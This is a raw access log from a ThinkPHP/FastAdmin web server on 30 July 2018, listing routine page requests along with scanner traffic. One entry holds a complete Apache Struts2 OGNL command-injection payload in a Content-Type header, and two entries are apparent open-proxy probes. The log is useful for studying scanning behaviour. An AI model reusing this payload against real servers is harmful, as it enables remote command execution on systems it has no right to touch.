[ 2018-07-30T07:59:22+08:00 ] 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
[ info ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.004414s][吞吐率：226.55req/s] [内存消耗：238.76kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000067s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000268s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T08:07:27+08:00 ] 82.177.111.26 GET /
[ info ] 118.24.114.43/ [运行时间：0.002012s][吞吐率：497.01req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000255s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000076s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T08:25:51+08:00 ] 131.108.54.146 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001942s][吞吐率：514.89req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000256s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000078s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T08:27:42+08:00 ] 103.47.216.149 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001845s][吞吐率：541.97req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000247s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000075s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T08:30:56+08:00 ] 74.82.47.5 GET /
[ info ] 118.24.114.43/ [运行时间：0.001859s][吞吐率：537.94req/s] [内存消耗：380.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000266s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000070s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T09:08:29+08:00 ] 80.211.60.18 GET /
[ info ] 118.24.114.43/ [运行时间：0.001867s][吞吐率：535.60req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000238s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000082s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T09:37:35+08:00 ] 119.18.157.142 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001922s][吞吐率：520.26req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000259s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000079s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T09:42:28+08:00 ] 201.93.210.221 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001889s][吞吐率：529.38req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000239s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T10:20:06+08:00 ] 36.233.46.24 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.003880s][吞吐率：257.75req/s] [内存消耗：381.67kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000012s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000204s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'accept' => '*/*',
  'host' => '118.24.114.43:8080',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000075s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T10:20:06+08:00 ] 36.233.46.24 GET /index.action
[ info ] 118.24.114.43:8080/index.action [运行时间：0.001041s][吞吐率：960.67req/s] [内存消耗：241.66kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000012s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000170s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => '*/*',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'host' => '118.24.114.43:8080',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T10:35:04+08:00 ] 31.135.129.115 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002111s][吞吐率：473.72req/s] [内存消耗：380.71kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000264s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T10:42:49+08:00 ] 115.94.11.165 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002137s][吞吐率：467.96req/s] [内存消耗：380.71kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000281s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000070s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T11:31:53+08:00 ] 80.82.70.187 GET http://www.baidu.com/cache/global/img/gs.gif
[ info ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.001559s][吞吐率：641.43req/s] [内存消耗：237.48kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000235s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T11:34:28+08:00 ] 177.67.9.65 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001775s][吞吐率：563.37req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000231s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T11:51:40+08:00 ] 187.95.16.103 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001845s][吞吐率：541.97req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000238s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T12:10:06+08:00 ] 192.241.144.203 GET /
[ info ] 118.24.114.43/ [运行时间：0.001845s][吞吐率：542.04req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000233s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000064s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T12:31:07+08:00 ] 102.248.179.30 GET /
[ info ] 118.24.114.43/ [运行时间：0.002071s][吞吐率：482.83req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000260s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000077s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T12:34:26+08:00 ] 103.85.149.202 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001930s][吞吐率：518.14req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000258s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000070s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T12:51:13+08:00 ] 177.185.213.122 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001895s][吞吐率：527.72req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000044s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000253s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000065s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T14:10:02+08:00 ] 103.69.218.155 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001784s][吞吐率：560.51req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000245s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000074s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T14:24:16+08:00 ] 81.162.195.235 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001923s][吞吐率：520.06req/s] [内存消耗：359.14kb] [文件加载：66]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000246s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'accept-language' => 'en-US',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
  'accept-encoding' => '',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000069s ]
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
